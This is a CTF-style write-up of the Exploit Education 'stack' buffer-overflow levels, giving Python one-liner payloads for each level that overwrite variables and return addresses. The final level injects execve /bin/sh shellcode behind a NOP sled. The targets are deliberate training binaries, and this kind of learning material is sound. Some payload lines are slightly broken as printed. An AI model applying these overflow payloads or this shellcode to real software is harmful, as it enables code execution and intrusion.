# Stack

These seem like pretty straight-foreward buffer overflows on the stack.

## stack-zero

Pretty simple, we just need to overflow the 64-bytes buffer and access the changeme variable.

My solution:

```bash
python -c 'print "A"*65' | ./stack-zero
```

## stack-one

Again, pretty staright-foreward, and we'll use the ascii values, just for fun (dont forget endiannes!):

```bash
./stack-one $(python -c 'print "A"*64 + "bYlI"')
```

## stack-two

Now with unprintable characters:

```bash
ExploitEducation=$(python -c 'print "A"*64 + "\x0a\x09\x0a\x0d"')
export ExploitEducation
./stack-two
```

## stack-three

Not that complicated, we take the address of `complete_level` and override `fp` to point to it:

```bash
objdump -d stack-three | grep complete
# Take the address of complete_level - in my case 0x40069d
python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three
```

## stack-four

Pretty common buffer overflow on the stack, overwriting the return address saved on the stack.

We just need to find the actual amount of `A`'s to push before putting our return address:

```bash
gdb stack-four
disassemble start_level
# We see that an area of 0x50 bytes is allocated on the stack, plus the 8 bytes for the previous base pointer
disassemble complete_level
# we note that the address of complete_level is 0x40061d, and quit gdb
quit
```

Now, for the exploit:
```bash
python -c 'print "A"*0x58 + "\x1d\x06\x40"' " ./stack-four
```

## stack-five

A pretty basic example of shellcoding, where we want to spawn a shell. I 'borrowed' some code from shellstorm: `"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"` (credit to http://shell-storm.org/shellcode/files/shellcode-806.php).

So we'd push this onto the stack, and then overwrite the saved instrcution pointer to point to the start of our shellcode, taking control of execution and spawning shell.

We just need to find the offset of the stored instruction pointer on the stack, and find the address on the stack of our shellcode, which we can find using `gdb`.  

```
python -c 'print "\x90"*0x40 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f$
x05" + "\x90"*(0x48 - 27) + "\x10\xe6\xff\xff\xff\x7f"' > /tmp/file1
cat /tmp/file1 - | ./stack_five
```

### Notes
* Make sure to `unset` the environment variables `LINES` and `COLUMNS` in `gdb` to get a more accurate model of the layout of the stack addresses in the real process.
* Make sure to use a `NOP` sled at the start of our shellcode to get a bit more leeway in our `ret`.
* Make sure to do `cat /tmp/payload -` so we can direct input to the shell we get.

